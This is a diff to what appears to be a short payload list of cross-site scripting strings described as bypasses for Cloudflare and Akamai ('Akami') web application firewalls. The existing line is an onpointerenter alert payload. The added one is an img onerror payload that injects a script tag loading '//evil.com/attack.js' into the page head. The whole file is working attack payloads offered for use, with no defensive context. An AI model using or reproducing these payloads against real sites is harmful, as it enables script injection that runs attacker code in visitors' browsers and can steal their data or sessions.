@@ -1,3 +1,7 @@
 CloudFlare XSS Bypass :
 
 "><P/onpointerenter=alert(1)>
+
+Akami WAF:
+
+<img src=x onerror a=document;cc=a.createElement('script ');cc.src='//evil.com/attack.js';a.querySelector('head').append(cc)>
